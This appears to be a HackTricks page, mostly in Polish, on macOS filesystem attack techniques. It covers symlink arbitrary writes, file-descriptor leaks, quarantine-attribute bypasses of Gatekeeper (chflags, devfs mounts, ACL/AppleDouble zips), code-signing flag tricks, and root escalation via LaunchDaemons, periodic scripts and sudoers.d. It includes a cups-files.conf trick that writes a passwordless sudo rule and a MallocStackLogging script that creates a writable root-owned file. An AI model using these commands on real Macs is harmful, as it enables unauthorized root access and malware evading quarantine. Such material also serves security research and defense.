# macOS FS Tricks

{{#include ../../../../banners/hacktricks-training.md}}

## Kombinacje uprawnień POSIX

Uprawnienia w **katalogu**:

- **odczyt** - możesz **wyliczać** wpisy w katalogu
- **zapis** - możesz **usuwać/zapisywać** **pliki** w katalogu i możesz **usuwać puste foldery**.
- Ale **nie możesz usuwać/modyfikować folderów, które nie są puste**, chyba że masz nad nimi uprawnienia do zapisu.
- **Nie możesz zmieniać nazwy folderu**, chyba że jesteś jego właścicielem.
- **wykonanie** - masz **prawo do przechodzenia** przez katalog - jeśli nie masz tego prawa, nie możesz uzyskać dostępu do żadnych plików w nim ani w żadnych podkatalogach.

### Niebezpieczne kombinacje

**Jak nadpisać plik/folder należący do roota**, ale:

- Jeden rodzic **właściciel katalogu** w ścieżce to użytkownik
- Jeden rodzic **właściciel katalogu** w ścieżce to **grupa użytkowników** z **dostępem do zapisu**
- Grupa użytkowników ma **dostęp do zapisu** do **pliku**

Przy dowolnej z powyższych kombinacji, atakujący mógłby **wstrzyknąć** **link symboliczny/twardy** do oczekiwanej ścieżki, aby uzyskać uprzywilejowany, dowolny zapis.

### Folder root R+X Specjalny przypadek

Jeśli w **katalogu** znajdują się pliki, do których **tylko root ma dostęp R+X**, to **nie są one dostępne dla nikogo innego**. Tak więc luka pozwalająca na **przeniesienie pliku, który jest czytelny dla użytkownika**, który nie może być odczytany z powodu tej **ograniczenia**, z tego folderu **do innego**, mogłaby być wykorzystana do odczytu tych plików.

Przykład w: [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions)

## Link symboliczny / Link twardy

### Umożliwiony plik/folder

Jeśli uprzywilejowany proces zapisuje dane w **pliku**, który mógłby być **kontrolowany** przez **użytkownika o niższych uprawnieniach**, lub który mógłby być **wcześniej utworzony** przez użytkownika o niższych uprawnieniach. Użytkownik mógłby po prostu **wskazać go na inny plik** za pomocą linku symbolicznego lub twardego, a uprzywilejowany proces zapisze w tym pliku.

Sprawdź w innych sekcjach, gdzie atakujący mógłby **wykorzystać dowolny zapis do eskalacji uprawnień**.

### Otwórz `O_NOFOLLOW`

Flaga `O_NOFOLLOW` używana przez funkcję `open` nie będzie podążać za linkiem symbolicznym w ostatnim komponencie ścieżki, ale będzie podążać za resztą ścieżki. Prawidłowy sposób zapobiegania podążaniu za linkami symbolicznymi w ścieżce to użycie flagi `O_NOFOLLOW_ANY`.

## .fileloc

Pliki z rozszerzeniem **`.fileloc`** mogą wskazywać na inne aplikacje lub binaria, więc gdy są otwierane, aplikacja/binary będzie tą, która zostanie uruchomiona.\
Przykład:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## Deskryptory plików

### Wycieki FD (brak `O_CLOEXEC`)

Jeśli wywołanie `open` nie ma flagi `O_CLOEXEC`, deskryptor pliku zostanie odziedziczony przez proces potomny. Tak więc, jeśli proces z uprawnieniami otworzy plik z uprawnieniami i wykona proces kontrolowany przez atakującego, atakujący **odziedziczy FD do pliku z uprawnieniami**.

Jeśli możesz sprawić, aby **proces otworzył plik lub folder z wysokimi uprawnieniami**, możesz nadużyć **`crontab`**, aby otworzyć plik w `/etc/sudoers.d` z **`EDITOR=exploit.py`**, dzięki czemu `exploit.py` uzyska FD do pliku w `/etc/sudoers` i go nadużyje.

Na przykład: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098), kod: https://github.com/gergelykalman/CVE-2023-32428-a-macOS-LPE-via-MallocStackLogging

## Unikaj sztuczek z xattrs kwarantanny

### Usuń to
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable flag

Jeśli plik/folder ma ten atrybut niemutowalny, nie będzie możliwe dodanie xattr do niego.
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### defvfs mount

Montaż **devfs** **nie obsługuje xattr**, więcej informacji w [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
```bash
mkdir /tmp/mnt
mount_devfs -o noowners none "/tmp/mnt"
chmod 777 /tmp/mnt
mkdir /tmp/mnt/lol
xattr -w com.apple.quarantine "" /tmp/mnt/lol
xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
```
### writeextattr ACL

Ten ACL zapobiega dodawaniu `xattrs` do pliku
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

Format pliku **AppleDouble** kopiuje plik wraz z jego ACEs.

W [**kodzie źródłowym**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) można zobaczyć, że tekstowa reprezentacja ACL przechowywana w xattr o nazwie **`com.apple.acl.text`** zostanie ustawiona jako ACL w dekompresowanym pliku. Więc, jeśli skompresujesz aplikację do pliku zip w formacie **AppleDouble** z ACL, który uniemożliwia zapisanie innych xattrs... xattr kwarantanny nie został ustawiony w aplikacji:

Sprawdź [**oryginalny raport**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) po więcej informacji.

Aby to powtórzyć, najpierw musimy uzyskać poprawny ciąg acl:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Note that even if this works the sandbox write the quarantine xattr before)

Nie jest to naprawdę potrzebne, ale zostawiam to na wszelki wypadek:

{{#ref}}
macos-xattr-acls-extra-stuff.md
{{#endref}}

## Ominięcie kontroli podpisów

### Ominięcie kontroli binarnych platform

Niektóre kontrole bezpieczeństwa sprawdzają, czy binarny plik jest **binarnym plikiem platformy**, na przykład, aby umożliwić połączenie z usługą XPC. Jednak, jak pokazano w omijaniu w https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/, możliwe jest ominięcie tej kontroli, uzyskując binarny plik platformy (tak jak /bin/ls) i wstrzykując exploit za pomocą dyld, używając zmiennej środowiskowej `DYLD_INSERT_LIBRARIES`.

### Ominięcie flag `CS_REQUIRE_LV` i `CS_FORCED_LV`

Możliwe jest, aby wykonywany binarny plik zmodyfikował swoje własne flagi, aby ominąć kontrole za pomocą kodu takiego jak:
```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```
## Ominięcie Podpisów Kodów

Bundles zawierają plik **`_CodeSignature/CodeResources`**, który zawiera **hash** każdego pojedynczego **pliku** w **bundle**. Należy zauważyć, że hash CodeResources jest również **osadzony w wykonywalnym**, więc nie możemy tego zepsuć.

Jednak istnieją pewne pliki, których podpis nie będzie sprawdzany, mają one klucz omit w plist, takie jak:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
Można obliczyć podpis zasobu z poziomu CLI za pomocą:
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## Montowanie dmg

Użytkownik może zamontować niestandardowy dmg utworzony nawet na istniejących folderach. W ten sposób można stworzyć niestandardowy pakiet dmg z niestandardową zawartością:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
Zwykle macOS montuje dysk, komunikując się z usługą Mach `com.apple.DiskArbitrarion.diskarbitrariond` (dostarczaną przez `/usr/libexec/diskarbitrationd`). Jeśli dodasz parametr `-d` do pliku plist LaunchDaemons i uruchomisz ponownie, będzie przechowywać logi w `/var/log/diskarbitrationd.log`.\
Jednak możliwe jest użycie narzędzi takich jak `hdik` i `hdiutil`, aby komunikować się bezpośrednio z kextem `com.apple.driver.DiskImages`.

## Dowolne zapisy

### Okresowe skrypty sh

Jeśli twój skrypt mógłby być interpretowany jako **skrypt powłoki**, możesz nadpisać **`/etc/periodic/daily/999.local`** skrypt powłoki, który będzie uruchamiany codziennie.

Możesz **sfałszować** wykonanie tego skryptu za pomocą: **`sudo periodic daily`**

### Demony

Napisz dowolny **LaunchDaemon** jak **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** z plist wykonującym dowolny skrypt jak:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
Just generate the script `/Applications/Scripts/privesc.sh` with the **commands** you would like to run as root.

### Sudoers File

If you have **arbitrary write**, you could create a file inside the folder **`/etc/sudoers.d/`** granting yourself **sudo** privileges.

### PATH files

The file **`/etc/paths`** is one of the main places that populates the PATH env variable. You must be root to overwrite it, but if a script from **privileged process** is executing some **command without the full path**, you might be able to **hijack** it modifying this file.

You can also write files in **`/etc/paths.d`** to load new folders into the `PATH` env variable.

### cups-files.conf

Ta technika została użyta w [this writeup](https://www.kandji.io/blog/macos-audit-story-part1).

Create the file `/etc/cups/cups-files.conf` with the following content:
```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```
To utworzy plik `/etc/sudoers.d/lpe` z uprawnieniami 777. Dodatkowy śmieć na końcu służy do wywołania utworzenia logu błędów.

Następnie, zapisz w `/etc/sudoers.d/lpe` potrzebną konfigurację do eskalacji uprawnień, taką jak `%staff ALL=(ALL) NOPASSWD:ALL`.

Następnie, zmodyfikuj plik `/etc/cups/cups-files.conf`, ponownie wskazując `LogFilePerm 700`, aby nowy plik sudoers stał się ważny, wywołując `cupsctl`.

### Sandbox Escape

Możliwe jest ucieczka z sandboxa macOS za pomocą FS arbitrary write. Dla niektórych przykładów sprawdź stronę [macOS Auto Start](../../../../macos-auto-start-locations.md), ale powszechnym przypadkiem jest zapisanie pliku preferencji Terminala w `~/Library/Preferences/com.apple.Terminal.plist`, który wykonuje polecenie przy starcie i wywołuje je za pomocą `open`.

## Generate writable files as other users

To wygeneruje plik, który należy do roota, a który jest zapisywalny przeze mnie ([**code from here**](https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew_lpe.sh)). To może również działać jako privesc:
```bash
DIRNAME=/usr/local/etc/periodic/daily

mkdir -p "$DIRNAME"
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit," "$DIRNAME"

MallocStackLogging=1 MallocStackLoggingDirectory=$DIRNAME MallocStackLoggingDontDeleteStackLogFile=1 top invalidparametername

FILENAME=$(ls "$DIRNAME")
echo $FILENAME
```
## Pamięć współdzielona POSIX

**Pamięć współdzielona POSIX** pozwala procesom w systemach operacyjnych zgodnych z POSIX na dostęp do wspólnej przestrzeni pamięci, co ułatwia szybszą komunikację w porównaniu do innych metod komunikacji międzyprocesowej. Polega to na tworzeniu lub otwieraniu obiektu pamięci współdzielonej za pomocą `shm_open()`, ustawianiu jego rozmiaru za pomocą `ftruncate()` oraz mapowaniu go w przestrzeni adresowej procesu za pomocą `mmap()`. Procesy mogą następnie bezpośrednio odczytywać i zapisywać w tej przestrzeni pamięci. Aby zarządzać równoczesnym dostępem i zapobiegać uszkodzeniu danych, często stosuje się mechanizmy synchronizacji, takie jak mutexy lub semafory. Na koniec procesy odmapowują i zamykają pamięć współdzieloną za pomocą `munmap()` i `close()`, a opcjonalnie usuwają obiekt pamięci za pomocą `shm_unlink()`. Ten system jest szczególnie skuteczny w przypadku efektywnej, szybkiej IPC w środowiskach, w których wiele procesów musi szybko uzyskiwać dostęp do współdzielonych danych.

<details>

<summary>Przykład kodu producenta</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>Przykład kodu konsumenckiego</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## macOS Guarded Descriptors

**macOSCguarded descriptors** to funkcja zabezpieczeń wprowadzona w macOS, mająca na celu zwiększenie bezpieczeństwa i niezawodności **operacji na deskryptorach plików** w aplikacjach użytkownika. Te zabezpieczone deskryptory umożliwiają powiązanie określonych ograniczeń lub "zabezpieczeń" z deskryptorami plików, które są egzekwowane przez jądro.

Funkcja ta jest szczególnie przydatna w zapobieganiu pewnym klasom luk w zabezpieczeniach, takim jak **nieautoryzowany dostęp do plików** lub **warunki wyścigu**. Te luki występują, gdy na przykład wątek uzyskuje dostęp do opisu pliku, dając **innemu podatnemu wątkowi dostęp do niego** lub gdy deskryptor pliku jest **dziedziczony** przez podatny proces potomny. Niektóre funkcje związane z tą funkcjonalnością to:

- `guarded_open_np`: Otwiera FD z zabezpieczeniem
- `guarded_close_np`: Zamyka go
- `change_fdguard_np`: Zmienia flagi zabezpieczeń na deskryptorze (nawet usuwając ochronę)

## References

- [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/)

{{#include ../../../../banners/hacktricks-training.md}}
